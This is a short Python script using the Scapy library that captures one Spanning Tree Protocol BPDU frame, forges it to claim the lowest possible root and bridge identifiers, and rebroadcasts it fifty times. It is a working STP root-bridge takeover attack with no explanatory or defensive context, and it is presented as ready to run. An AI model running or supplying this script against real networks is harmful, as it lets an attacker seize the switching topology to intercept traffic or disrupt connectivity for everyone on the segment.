from scapy.all import *
pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
pkt[0].src="00:00:00:00:00:01"
pkt[0].rootid=0
pkt[0].rootmac="00:00:00:00:00:01"
pkt[0].bridgeid=0  
pkt[0].bridgemac="00:00:00:00:00:01"
pkt[0].show()
for i in range (0, 50):
    sendp(pkt[0], loop=0, verbose=1)
    time.sleep(1)

